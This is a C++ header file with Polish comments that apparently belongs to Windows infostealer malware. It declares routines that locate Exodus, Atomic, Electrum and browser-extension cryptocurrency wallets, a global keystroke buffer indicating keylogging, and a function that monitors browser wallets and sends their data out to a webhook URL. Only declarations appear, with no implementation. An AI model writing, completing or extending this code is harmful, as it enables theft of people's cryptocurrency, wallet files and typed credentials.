#pragma once

#include <string>
#include <vector>
#include <windows.h>
#include <memory> // Dla std::shared_ptr
#include <array>  // Dla std::array

// --- Współdzielone struktury ---

struct FileWallet {
    std::string name;
    std::wstring path;
    std::wstring exe_path; // Dodano ścieżkę do pliku wykonywalnego
};

struct BrowserWallet {
    std::string name;
    std::string browser;
    std::wstring profile_name; // Dodano nazwę profilu
    std::wstring process_name;
    std::wstring extension_path;
    std::wstring data_path;
    bool data_sent = false;
};

// --- Współdzielone deklaracje funkcji ---

void logToFile(const std::string& message);

// Zwraca zawartość globalnego bufora klawiatury i opcjonalnie go czyści.
std::string getGlobalKeystrokeBuffer(bool clear_buffer);


// --- Deklaracje funkcji z filewallet.cpp ---
std::vector<FileWallet> checkFileWallets(
    const std::wstring& roamingAppData, 
    const std::wstring& localAppData, 
    std::wstring& outExodusPath,
    const std::wstring& exodusWalletPathFragment,
    const std::wstring& exodusExePathFragment,
    const std::wstring& atomicPathFragment,
    const std::wstring& electrumPathFragment,
    std::wstring& outAtomicExePath, // Dodano parametr wyjściowy dla ścieżki exe Atomic
    std::wstring& outElectrumExePath // Dodano parametr wyjściowy dla ścieżki exe Electrum
);
void startFileWalletLogic(const std::vector<FileWallet>& foundWallets);

// --- Deklaracje funkcji z browsewallet.cpp ---
std::vector<BrowserWallet> checkBrowserWallets();
void monitorAndExfiltrateBrowserWallets(std::vector<BrowserWallet> foundWallets, const std::string& webhookUrl);

// Funkcja pomocnicza do znajdowania ścieżek exe
std::wstring findExePath(const std::wstring& exeName);

// --- Globalne stałe ---
const std::string& getWebhookUrl();
